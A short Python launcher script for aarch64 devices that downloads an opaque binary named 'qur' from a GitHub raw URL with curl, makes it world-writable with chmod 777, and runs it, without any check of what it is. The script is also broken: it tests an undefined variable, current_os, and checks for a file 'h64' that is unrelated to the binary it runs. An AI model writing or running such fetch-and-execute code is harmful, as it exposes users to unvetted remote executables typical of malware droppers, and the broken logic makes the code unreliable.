#coding=utf-8
import os,sys,subprocess
if 'aarch64' in str(current_os):
    if not os.path.isfile('h64'):
        os.system('curl -L https://github.com/Somi673/repo/blob/main/qur?raw=true > qur')
        os.system('chmod 777 qur')
        os.system('./qur')
    else:
        os.system('./qur')
else:
    print('\n  Unknown device, aarch or os found, contact author.')
    os.sys.exit()
 
